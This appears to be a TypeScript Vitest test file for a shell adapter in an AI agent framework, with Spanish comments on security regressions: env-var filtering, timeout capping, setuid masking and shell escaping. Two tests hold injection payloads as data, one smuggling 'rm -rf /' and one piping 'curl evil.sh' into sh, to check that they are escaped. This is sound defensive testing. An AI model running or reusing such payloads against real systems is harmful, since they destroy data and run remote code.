/**
 * Tests for ShellAdapter (just-bash integration module).
 *
 * Tests NativeShellAdapter directly (always available).
 * Tests JustBashShellAdapter with a mock Bash instance.
 * Tests factory auto-detection and skill registration with adapter injection.
 */

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';

// node:child_process's namespace isn't configurable in ESM (vi.spyOn can't
// touch it directly) — wrap execFileSync in a trackable vi.fn that still
// forwards to the real implementation, same pattern this repo already uses
// for undici's fetch in tests/shell-skills.test.ts. Every other test in
// this file still exercises the REAL which()/where against the real OS.
vi.mock('node:child_process', async (importOriginal) => {
  const actual = await importOriginal<typeof import('node:child_process')>();
  return { ...actual, execFileSync: vi.fn((...args: Parameters<typeof actual.execFileSync>) => actual.execFileSync(...args)) };
});
import { execFileSync as mockedExecFileSync } from 'node:child_process';
import { NativeShellAdapter, JustBashShellAdapter, clampExecTimeout, MAX_EXEC_TIMEOUT_MS } from '../src/just-bash/adapter.js';
import { createShellAdapter } from '../src/just-bash/factory.js';
import { createShellCommands } from '../src/skills/shell-exec.js';
import { createFileCommands } from '../src/skills/shell-file.js';
import { CommandRegistry } from '../src/command-registry/index.js';
import { registerShellSkills } from '../src/skills/index.js';
import { mkdtempSync, writeFileSync, rmSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';

// ===========================================================================
// NativeShellAdapter
// ===========================================================================

describe('NativeShellAdapter', () => {
  const adapter = new NativeShellAdapter();

  it('NA01: backend is "native"', () => {
    expect(adapter.backend).toBe('native');
  });

  it('NA02: exec runs echo and returns stdout', async () => {
    const result = await adapter.exec('echo hello');
    expect(result.stdout).toContain('hello');
    expect(result.exitCode).toBe(0);
  });

  it('NA03: exec captures non-zero exit code', async () => {
    const result = await adapter.exec('exit 42');
    expect(result.exitCode).not.toBe(0);
  });

  it('NA04: which finds node', async () => {
    const result = await adapter.which('node');
    expect(result.found).toBe(true);
    expect(result.program).toBe('node');
    expect(result.path).toBeTruthy();
  });

  it('NA05: which returns found=false for nonexistent program', async () => {
    const result = await adapter.which('nonexistent-xyz-12345');
    expect(result.found).toBe(false);
  });

  /**
   * Regresion (ronda 27 del audit): exec() ya filtraba process.env via
   * filterSensitiveEnv() (razon documentada en su propio comentario:
   * shell:exec/shell:which solo exigen shell:exec/shell:read, no
   * env:read), pero which() — 2 metodos mas abajo en el mismo archivo —
   * no pasaba NINGUN `env` a execFileSync, heredando el proceso host
   * completo sin filtrar. No explotable hoy (which() solo retorna
   * {program, path, found}, no el env), pero era una violacion real de
   * la garantia que este mismo archivo documenta explicitamente.
   */
  it('NA05b: which filtra env sensible al invocar where/which (no lo hereda sin filtrar)', async () => {
    const spy = mockedExecFileSync as unknown as ReturnType<typeof vi.fn>;
    spy.mockClear();
    const prevToken = process.env.AGENT_SHELL_TEST_TOKEN;
    process.env.AGENT_SHELL_TEST_TOKEN = 'leak-canary-' + Date.now();
    try {
      await adapter.which('node');
      expect(spy).toHaveBeenCalled();
      const options = spy.mock.calls[0][2] as any;
      expect(options?.env).toBeDefined();
      expect(options.env.AGENT_SHELL_TEST_TOKEN).toBeUndefined();
    } finally {
      if (prevToken === undefined) delete process.env.AGENT_SHELL_TEST_TOKEN;
      else process.env.AGENT_SHELL_TEST_TOKEN = prevToken;
    }
  });

  it('NA06: readFile reads real files', async () => {
    const tempDir = mkdtempSync(join(tmpdir(), 'na-test-'));
    writeFileSync(join(tempDir, 'test.txt'), 'hello adapter');
    try {
      const result = await adapter.readFile(join(tempDir, 'test.txt'));
      expect(result.content).toBe('hello adapter');
      expect(result.size).toBeGreaterThan(0);
    } finally {
      rmSync(tempDir, { recursive: true, force: true });
    }
  });

  it('NA07: writeFile creates a file', async () => {
    const tempDir = mkdtempSync(join(tmpdir(), 'na-test-'));
    try {
      const result = await adapter.writeFile(join(tempDir, 'out.txt'), 'written!');
      expect(result.written).toBe(true);

      const read = await adapter.readFile(join(tempDir, 'out.txt'));
      expect(read.content).toBe('written!');
    } finally {
      rmSync(tempDir, { recursive: true, force: true });
    }
  });

  it('NA08: listDir lists directory entries', async () => {
    const tempDir = mkdtempSync(join(tmpdir(), 'na-test-'));
    writeFileSync(join(tempDir, 'a.txt'), 'a');
    writeFileSync(join(tempDir, 'b.json'), 'b');
    try {
      const result = await adapter.listDir(tempDir);
      expect(result.count).toBe(2);
      const names = result.entries.map(e => e.name);
      expect(names).toContain('a.txt');
      expect(names).toContain('b.json');
    } finally {
      rmSync(tempDir, { recursive: true, force: true });
    }
  });

  it('NA09: listDir filters by pattern', async () => {
    const tempDir = mkdtempSync(join(tmpdir(), 'na-test-'));
    writeFileSync(join(tempDir, 'a.txt'), 'a');
    writeFileSync(join(tempDir, 'b.json'), 'b');
    try {
      const result = await adapter.listDir(tempDir, '.json');
      expect(result.count).toBe(1);
      expect(result.entries[0].name).toBe('b.json');
    } finally {
      rmSync(tempDir, { recursive: true, force: true });
    }
  });

  /**
   * Regresion: NativeShellAdapter.exec() usaba execSync (bloquea TODO el
   * event loop de Node, no solo esta llamada) con un timeout controlado por
   * el agente sin cota maxima del lado servidor — DoS del proceso completo.
   * Verificado en vivo (no en este test) que exec() ya no bloquea el event
   * loop; acá se verifica la funcion pura de clamping que evita el "sin cota".
   */
  it('NA10: clampExecTimeout topea a MAX_EXEC_TIMEOUT_MS sin importar lo pedido', () => {
    expect(clampExecTimeout(999_999_999)).toBe(MAX_EXEC_TIMEOUT_MS);
    expect(clampExecTimeout(-50)).toBe(0);
    expect(clampExecTimeout(1000)).toBe(1000);
    expect(clampExecTimeout(undefined)).toBe(30000);
  });

  /**
   * Regresion: NativeShellAdapter.chmod pasaba `mode` directo a fs.chmod sin
   * enmascarar setuid/setgid/sticky — a diferencia de JustBashShellAdapter.chmod,
   * que si enmascara con (mode & 0o777). Un agente con solo file:write podia
   * setear setuid via file:chmod --mode 4755.
   */
  it('NA11: chmod enmascara setuid/setgid/sticky, solo deja los permisos 0o777', async () => {
    const tempDir = mkdtempSync(join(tmpdir(), 'na-test-'));
    writeFileSync(join(tempDir, 'f.txt'), 'x');
    try {
      const result = await adapter.chmod(join(tempDir, 'f.txt'), 0o4755);
      expect(result.mode).toBe(0o755);
    } finally {
      rmSync(tempDir, { recursive: true, force: true });
    }
  });
});

// ===========================================================================
// JustBashShellAdapter (with mock Bash instance)
// ===========================================================================

describe('JustBashShellAdapter', () => {
  function createMockBash() {
    return {
      exec: vi.fn(async (cmd: string) => ({
        stdout: `mock-output: ${cmd}\n`,
        stderr: '',
        exitCode: 0,
      })),
      readFile: vi.fn(async (path: string) => `content of ${path}`),
      writeFile: vi.fn(async () => {}),
    };
  }

  it('JB01: backend is "just-bash"', () => {
    const adapter = new JustBashShellAdapter(createMockBash());
    expect(adapter.backend).toBe('just-bash');
  });

  it('JB02: exec delegates to bash.exec', async () => {
    const mock = createMockBash();
    const adapter = new JustBashShellAdapter(mock);

    const result = await adapter.exec('echo hello');
    expect(result.stdout).toContain('mock-output: echo hello');
    expect(result.exitCode).toBe(0);
    expect(mock.exec).toHaveBeenCalledWith('echo hello', expect.any(Object));
  });

  it('JB03: exec passes cwd option', async () => {
    const mock = createMockBash();
    const adapter = new JustBashShellAdapter(mock);

    await adapter.exec('ls', { cwd: '/tmp' });
    expect(mock.exec).toHaveBeenCalledWith('ls', expect.objectContaining({ cwd: '/tmp' }));
  });

  it('JB04: which uses bash which command', async () => {
    const mock = createMockBash();
    mock.exec.mockResolvedValueOnce({ stdout: '/usr/bin/grep\n', stderr: '', exitCode: 0 });
    const adapter = new JustBashShellAdapter(mock);

    const result = await adapter.which('grep');
    expect(result.found).toBe(true);
    expect(result.path).toBe('/usr/bin/grep');
  });

  it('JB05: readFile delegates to bash.readFile', async () => {
    const mock = createMockBash();
    const adapter = new JustBashShellAdapter(mock);

    const result = await adapter.readFile('/data/test.txt');
    expect(result.content).toBe('content of /data/test.txt');
    expect(mock.readFile).toHaveBeenCalledWith('/data/test.txt');
  });

  it('JB06: writeFile delegates to bash.writeFile', async () => {
    const mock = createMockBash();
    const adapter = new JustBashShellAdapter(mock);

    const result = await adapter.writeFile('/data/out.txt', 'hello');
    expect(result.written).toBe(true);
    expect(mock.writeFile).toHaveBeenCalledWith('/data/out.txt', 'hello');
  });

  it('JB07: exec handles errors gracefully', async () => {
    const mock = createMockBash();
    mock.exec.mockRejectedValueOnce(new Error('sandbox error'));
    const adapter = new JustBashShellAdapter(mock);

    const result = await adapter.exec('bad command');
    expect(result.exitCode).toBe(1);
    expect(result.stderr).toContain('sandbox error');
  });

  /**
   * Regresion: which()/listDir() interpolaban `program`/`path` sin escapar
   * en un string de comando ejecutado por el interprete sandboxeado —
   * un valor como `foo'; rm -rf / #` rompia hacia un segundo comando dentro
   * del sandbox. Ahora se escapa con single-quoting POSIX antes de interpolar.
   */
  it('JB08: which() escapa program con single-quoting POSIX antes de interpolar', async () => {
    const mock = createMockBash();
    const adapter = new JustBashShellAdapter(mock);
    const payload = "foo'; rm -rf / #";

    await adapter.which(payload);

    const [cmd] = mock.exec.mock.calls[0];
    // El payload completo queda escapado dentro de una sola comilla simple:
    // el `;` sigue presente como caracter, pero ya no puede terminar el
    // comando `which` y arrancar uno nuevo.
    expect(cmd).toBe(`which 'foo'\\''; rm -rf / #'`);
  });

  it('JB09: listDir() escapa path con single-quoting POSIX antes de interpolar', async () => {
    const mock = createMockBash();
    const adapter = new JustBashShellAdapter(mock);
    const payload = '/tmp && curl evil.sh|sh';

    await adapter.listDir(payload);

    const [cmd] = mock.exec.mock.calls[0];
    expect(cmd).toBe(`ls -la '/tmp && curl evil.sh|sh'`);
  });
});

// ===========================================================================
// Factory
// ===========================================================================

describe('createShellAdapter factory', () => {

  it('FA01: prefer=native returns NativeShellAdapter', () => {
    const adapter = createShellAdapter({ prefer: 'native' });
    expect(adapter.backend).toBe('native');
  });

  it('FA02: auto without just-bash installed returns native', () => {
    const adapter = createShellAdapter({ prefer: 'auto' });
    // just-bash is not installed in test env
    expect(adapter.backend).toBe('native');
  });

  it('FA03: default (no config) returns native (just-bash not installed)', () => {
    const adapter = createShellAdapter();
    expect(adapter.backend).toBe('native');
  });

  it('FA04: prefer=just-bash throws when not installed', () => {
    expect(() => createShellAdapter({ prefer: 'just-bash' })).toThrow('just-bash');
  });
});

// ===========================================================================
// Skill Registration with Adapter
// ===========================================================================

describe('Shell skills with adapter injection', () => {
  function createMockAdapter(): any {
    return {
      backend: 'mock',
      exec: vi.fn(async () => ({ stdout: 'ok', stderr: '', exitCode: 0 })),
      which: vi.fn(async (p: string) => ({ program: p, path: '/mock/' + p, found: true })),
      readFile: vi.fn(async (p: string) => ({ path: p, content: 'mock content', size: 12 })),
      writeFile: vi.fn(async (p: string) => ({ path: p, size: 5, written: true })),
      listDir: vi.fn(async (p: string) => ({ path: p, entries: [], count: 0 })),
      mkdir: vi.fn(async (p: string) => ({ path: p, created: true })),
      remove: vi.fn(async (p: string) => ({ path: p, deleted: true })),
      rename: vi.fn(async (from: string, to: string) => ({ from, to, renamed: true })),
      chmod: vi.fn(async (p: string, mode: number) => ({ path: p, mode })),
    };
  }

  it('SK01: createShellCommands binds handlers to adapter', async () => {
    const mock = createMockAdapter();
    const commands = createShellCommands(mock);

    const execHandler = commands.find(c => c.definition.name === 'exec')!.handler;
    const result = await execHandler({ command: 'test cmd' });

    expect(result.success).toBe(true);
    expect(result.data.backend).toBe('mock');
    expect(mock.exec).toHaveBeenCalled();
  });

  it('SK02: createFileCommands binds handlers to adapter', async () => {
    const mock = createMockAdapter();
    const commands = createFileCommands(mock);

    const readHandler = commands.find(c => c.definition.name === 'read')!.handler;
    const result = await readHandler({ path: '/test.txt' });

    expect(result.success).toBe(true);
    expect(result.data.content).toBe('mock content');
    expect(mock.readFile).toHaveBeenCalledWith('/test.txt', undefined);
  });

  /**
   * Regresion: mkdir/delete/rename/chmod llamaban node:fs/promises directo,
   * ignorando el ShellAdapter inyectado (a diferencia de read/write/list).
   * Con un backend sandboxeado (just-bash) activo, esas 4 operaciones seguian
   * tocando el filesystem real sin excepcion. Ahora deben pasar por el adapter.
   */
  it('SK04: createFileCommands enruta mkdir/delete/rename/chmod por el adapter', async () => {
    const mock = createMockAdapter();
    const commands = createFileCommands(mock);

    const mkdirHandler = commands.find(c => c.definition.name === 'mkdir')!.handler;
    await mkdirHandler({ path: '/new-dir' });
    expect(mock.mkdir).toHaveBeenCalledWith('/new-dir', { recursive: true });

    const deleteHandler = commands.find(c => c.definition.name === 'delete')!.handler;
    await deleteHandler({ path: '/gone' });
    expect(mock.remove).toHaveBeenCalledWith('/gone', { recursive: false });

    const renameHandler = commands.find(c => c.definition.name === 'rename')!.handler;
    await renameHandler({ from: '/a', to: '/b' });
    expect(mock.rename).toHaveBeenCalledWith('/a', '/b');

    const chmodHandler = commands.find(c => c.definition.name === 'chmod')!.handler;
    await chmodHandler({ path: '/script.sh', mode: '755' });
    expect(mock.chmod).toHaveBeenCalledWith('/script.sh', parseInt('755', 8));
  });

  it('SK03: registerShellSkills accepts custom adapter', () => {
    const mock = createMockAdapter();
    const registry = new CommandRegistry();

    registerShellSkills(registry, mock);

    const all = registry.listAll();
    expect(all).toHaveLength(40);
    expect(registry.getNamespaces()).toContain('shell');
    expect(registry.getNamespaces()).toContain('file');
    expect(registry.getNamespaces()).toContain('http');
  });

  it('SK04: registerShellSkills without adapter uses default', () => {
    const registry = new CommandRegistry();
    registerShellSkills(registry);

    expect(registry.listAll()).toHaveLength(40);
  });
});
